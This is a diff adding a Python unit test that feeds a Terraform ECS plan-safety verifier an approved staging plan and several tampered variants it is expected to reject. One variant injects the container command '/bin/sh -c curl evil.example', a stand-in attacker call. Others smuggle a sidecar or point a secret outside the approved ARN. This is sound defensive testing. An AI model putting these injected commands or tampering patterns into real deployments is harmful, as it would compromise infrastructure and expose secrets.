+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
+
+    def test_real_pending_fieldzilla_plan_shape(self) -> None:
+        """Sanitized fixture matching the actual pending FieldZilla staging plan: all four
+        families in one plan, api as a pure create (superseding the manually created
+        api:6/worker:6 revisions this pipeline must never import), admin-web/worker/migration
+        as normal replacements, two distinct repository digests, and the full range of
+        malformed/adversarial variants. No field here was invented -- every key/value in the
+        approved fixture matches infra/aws/compute.tf and infra/aws/locals.tf at
+        2c8a4015fd4a97d1c582475a6939cf8fb988b2fb, or the live pre-existing revisions for the
+        replace-shaped families (5/6/7) that the same reviewed source produced."""
+        runtime_arn = auth.EXACT_RUNTIME_SECRET_ARN
+
+        def approved_secrets(keys: frozenset[str]) -> list[dict[str, str]]:
+            return [{"name": key, "valueFrom": f"{runtime_arn}:{key}::"} for key in sorted(keys)]
+
+        def container_for(family: str, sha: str) -> dict[str, object]:
+            baseline = auth.FIELDZILLA_TASK_DEFINITION_BASELINE[family]
+            container = {k: v for k, v in baseline["container"].items() if k != "secret_keys"}
+            container["image"] = f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/{baseline['ecr_repository']}:{sha}"
+            secrets = approved_secrets(baseline["container"]["secret_keys"])
+            if secrets:
+                container["secrets"] = secrets
+            return container
+
+        def task_def_fields(family: str) -> dict[str, object]:
+            baseline = auth.FIELDZILLA_TASK_DEFINITION_BASELINE[family]
+            return {
+                "family": family,
+                "cpu": baseline["cpu"],
+                "memory": baseline["memory"],
+                "execution_role_arn": baseline["execution_role_arn"],
+                "task_role_arn": baseline["task_role_arn"],
+                "network_mode": baseline["network_mode"],
+                "requires_compatibilities": baseline["requires_compatibilities"],
+                "runtime_platform": baseline["runtime_platform"],
+                "volume": baseline["volume"],
+                "placement_constraints": baseline["placement_constraints"],
+                "proxy_configuration": baseline["proxy_configuration"],
+                "ephemeral_storage": baseline["ephemeral_storage"],
+            }
+
+        PRIOR_SHA = "ab91e3d3ec4efc932363922f6533d0188c010c57"
+
+        def base_plan() -> dict[str, object]:
+            # api: pure create -- Terraform has no prior state (the live api:6 was created
+            # manually, outside this pipeline, and must be superseded, not imported).
+            api_after = {**task_def_fields("fieldzilla-staging-api"), "container_definitions": json.dumps([container_for("fieldzilla-staging-api", DEPLOY_SHA)], sort_keys=True)}
+            # admin-web/worker/migration: normal replacements -- Terraform already tracks a
+            # prior governed revision for these, only the image tag (and, for worker/
+            # migration, the secrets list) changes.
+            def replacement(family: str, before_containers: list[dict[str, object]]) -> dict[str, object]:
+                before = {**task_def_fields(family), "container_definitions": json.dumps(before_containers, sort_keys=True)}
+                after = {**task_def_fields(family), "container_definitions": json.dumps([container_for(family, DEPLOY_SHA)], sort_keys=True)}
+                return {"before": before, "after": after}
+
+            admin_before = [{k: v for k, v in container_for("fieldzilla-staging-admin-web", PRIOR_SHA).items()}]
+            worker_before_baseline = auth.FIELDZILLA_TASK_DEFINITION_BASELINE["fieldzilla-staging-worker"]
+            worker_before = {k: v for k, v in worker_before_baseline["container"].items() if k != "secret_keys"}
+            worker_before["image"] = f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/{worker_before_baseline['ecr_repository']}:{PRIOR_SHA}"
+            worker_before["secrets"] = approved_secrets(frozenset({"APP_SECRET_KEY", "APP_DATABASE_CONTEXT_SECRET", "APP_DATABASE_URL", "APP_FIELD_ENCRYPTION_MASTER_KEY", "APP_CORS_ORIGINS"}))
+            migration_before_baseline = auth.FIELDZILLA_TASK_DEFINITION_BASELINE["fieldzilla-staging-migration"]
+            migration_before = {k: v for k, v in migration_before_baseline["container"].items() if k != "secret_keys"}
+            migration_before["image"] = f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/{migration_before_baseline['ecr_repository']}:{PRIOR_SHA}"
+            migration_before["secrets"] = approved_secrets(frozenset({"APP_SECRET_KEY", "APP_DATABASE_CONTEXT_SECRET", "APP_DATABASE_URL", "APP_FIELD_ENCRYPTION_MASTER_KEY", "APP_CORS_ORIGINS"}))
+
+            admin_rc = replacement("fieldzilla-staging-admin-web", admin_before)
+            worker_rc = replacement("fieldzilla-staging-worker", [worker_before])
+            migration_rc = replacement("fieldzilla-staging-migration", [migration_before])
+
+            return {
+                "variables": {
+                    "enable_production": {"value": False},
+                    "route53_zone_id": {"value": ""},
+                    "container_instance_type": {"value": "c6g.medium"},
+                    "monthly_budget_usd": {"value": "100"},
+                    "image_tag": {"value": DEPLOY_SHA},
+                },
+                "resource_changes": [
+                    {"address": 'aws_ecs_task_definition.api["staging"]', "type": "aws_ecs_task_definition", "change": {"actions": ["create"], "before": None, "after": api_after}},
+                    {"address": 'aws_ecs_task_definition.admin["staging"]', "type": "aws_ecs_task_definition", "change": {"actions": ["delete", "create"], **admin_rc}},
+                    {"address": 'aws_ecs_task_definition.worker["staging"]', "type": "aws_ecs_task_definition", "change": {"actions": ["delete", "create"], **worker_rc}},
+                    {"address": 'aws_ecs_task_definition.migration["staging"]', "type": "aws_ecs_task_definition", "change": {"actions": ["delete", "create"], **migration_rc}},
+                    {
+                        "address": 'aws_ecs_service.api["staging"]', "type": "aws_ecs_service",
+                        "change": {"actions": ["update"], "before": {"task_definition": "arn:aws:ecs:ap-south-1:918870682888:task-definition/fieldzilla-staging-api:6"}, "after": {"task_definition": None}, "after_unknown": {"task_definition": True}},
+                    },
+                    {
+                        "address": 'aws_ecs_service.admin["staging"]', "type": "aws_ecs_service",
+                        "change": {"actions": ["update"], "before": {"task_definition": "arn:aws:ecs:ap-south-1:918870682888:task-definition/fieldzilla-staging-admin-web:6"}, "after": {"task_definition": None}, "after_unknown": {"task_definition": True}},
+                    },
+                    {
+                        "address": 'aws_ecs_service.worker["staging"]', "type": "aws_ecs_service",
+                        "change": {"actions": ["update"], "before": {"task_definition": "arn:aws:ecs:ap-south-1:918870682888:task-definition/fieldzilla-staging-worker:5"}, "after": {"task_definition": None}, "after_unknown": {"task_definition": True}},
+                    },
+                ],
+            }
+
+        args = Namespace(plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=ECS_FAMILIES)
+
+        def check(plan: dict[str, object], **arg_overrides: object) -> None:
+            use_args = Namespace(**{**vars(args), **arg_overrides})
+            with tempfile.TemporaryDirectory() as tmp:
+                plan_json = Path(tmp) / "plan.json"
+                plan_json.write_text(json.dumps(plan), encoding="utf-8")
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(use_args)))
+
+        def check_rejected(plan: dict[str, object], **arg_overrides: object) -> None:
+            use_args = Namespace(**{**vars(args), **arg_overrides})
+            with tempfile.TemporaryDirectory() as tmp:
+                plan_json = Path(tmp) / "plan.json"
+                plan_json.write_text(json.dumps(plan), encoding="utf-8")
+                with self.assertRaises(SystemExit):
+                    auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(use_args)))
+
+        # --- Approved: the real pending plan shape, with mandatory digest evidence for the
+        # api family's pure create (the replace-shaped families do not require it since
+        # image_digest_map is empty here, matching a non-"routine_ecs_only" review dispatch --
+        # routine_ecs_only is opt-in and, once supplied, is exercised by the digest-map tests
+        # in test_routine_ecs_authorization_binds_digest_family_and_blocks_non_ecs). ---
+        check(base_plan(), image_digest_map=DIGEST_MAP_JSON)
+
+        # --- Rejected: without digest evidence at all, the api pure-create cannot be
+        # approved (it always requires it, regardless of routine_ecs_only). ---
+        check_rejected(base_plan(), image_digest_map="")
+
+        # --- Rejected: sidecar smuggled into one of the replacement families. ---
+        sidecar_plan = base_plan()
+        worker_after = json.loads(sidecar_plan["resource_changes"][2]["change"]["after"]["container_definitions"])
+        worker_after.append(container_for("fieldzilla-staging-worker", DEPLOY_SHA))
+        sidecar_plan["resource_changes"][2]["change"]["after"]["container_definitions"] = json.dumps(worker_after)
+        check_rejected(sidecar_plan, image_digest_map=DIGEST_MAP_JSON)
+
+        # --- Rejected: altered role on a replacement family. ---
+        altered_role_plan = base_plan()
+        altered_role_plan["resource_changes"][1]["change"]["after"]["execution_role_arn"] = "arn:aws:iam::918870682888:role/Other"
+        check_rejected(altered_role_plan, image_digest_map=DIGEST_MAP_JSON)
+
+        # --- Rejected: altered CPU/memory on a replacement family. ---
+        altered_cpu_plan = base_plan()
+        altered_cpu_plan["resource_changes"][3]["change"]["after"]["cpu"] = "512"
+        check_rejected(altered_cpu_plan, image_digest_map=DIGEST_MAP_JSON)
+
+        # --- Rejected: altered command on a replacement family. ---
+        altered_command_plan = base_plan()
+        worker_after = json.loads(altered_command_plan["resource_changes"][2]["change"]["after"]["container_definitions"])
+        worker_after[0]["command"] = ["/bin/sh", "-c", "curl evil.example"]
+        altered_command_plan["resource_changes"][2]["change"]["after"]["container_definitions"] = json.dumps(worker_after)
+        check_rejected(altered_command_plan, image_digest_map=DIGEST_MAP_JSON)
+
+        # --- Rejected: secret pointing outside the approved runtime ARN on a replacement family. ---
+        altered_secret_plan = base_plan()
+        migration_after = json.loads(altered_secret_plan["resource_changes"][3]["change"]["after"]["container_definitions"])
+        migration_after[0]["secrets"] = [{"name": "APP_SECRET_KEY", "valueFrom": "arn:aws:secretsmanager:ap-south-1:918870682888:secret:/other/secret:APP_SECRET_KEY::"}]
+        altered_secret_plan["resource_changes"][3]["change"]["after"]["container_definitions"] = json.dumps(migration_after)
+        check_rejected(altered_secret_plan, image_digest_map=DIGEST_MAP_JSON)
+
+        # --- Rejected: networking/volume mutation on a replacement family. ---
+        altered_network_plan = base_plan()
+        altered_network_plan["resource_changes"][1]["change"]["after"]["network_mode"] = "awsvpc"
+        check_rejected(altered_network_plan, image_digest_map=DIGEST_MAP_JSON)
+        altered_volume_plan = base_plan()
+        altered_volume_plan["resource_changes"][1]["change"]["after"]["volume"] = [{"name": "data"}]
+        check_rejected(altered_volume_plan, image_digest_map=DIGEST_MAP_JSON)
+
+        # --- Rejected: wrong family, wrong repository, wrong SHA on the api create. ---
+        wrong_family_plan = base_plan()
+        wrong_family_plan["resource_changes"][0]["change"]["after"]["family"] = "fieldzilla-production-api"
+        check_rejected(wrong_family_plan, image_digest_map=DIGEST_MAP_JSON)
+
+        wrong_repo_plan = base_plan()
+        api_containers = json.loads(wrong_repo_plan["resource_changes"][0]["change"]["after"]["container_definitions"])
+        api_containers[0]["image"] = f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/{ADMIN_WEB_REPO}:{DEPLOY_SHA}"
+        wrong_repo_plan["resource_changes"][0]["change"]["after"]["container_definitions"] = json.dumps(api_containers)
+        check_rejected(wrong_repo_plan, image_digest_map=DIGEST_MAP_JSON)
+
+        wrong_sha_plan = base_plan()
+        api_containers = json.loads(wrong_sha_plan["resource_changes"][0]["change"]["after"]["container_definitions"])
+        api_containers[0]["image"] = f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/{API_REPO}:1111111111111111111111111111111111111111"
+        wrong_sha_plan["resource_changes"][0]["change"]["after"]["container_definitions"] = json.dumps(api_containers)
+        check_rejected(wrong_sha_plan, image_digest_map=DIGEST_MAP_JSON)
+
+        # --- Rejected: missing repository mapping, malformed digest JSON. (A validly
+        # formatted but semantically "wrong" digest value cannot be detected here -- the
+        # map is independently-attested operator evidence with no in-plan ground truth to
+        # compare against; see _parse_image_digest_map / _is_approved_baseline_container.) ---
+        check_rejected(base_plan(), image_digest_map=json.dumps({API_REPO: DIGEST_MAP[API_REPO]}))
+        check_rejected(base_plan(), image_digest_map="{not valid json")
 
     def test_verifies_import_map_and_rejects_wrong_ownership(self) -> None:
         good_doc = {
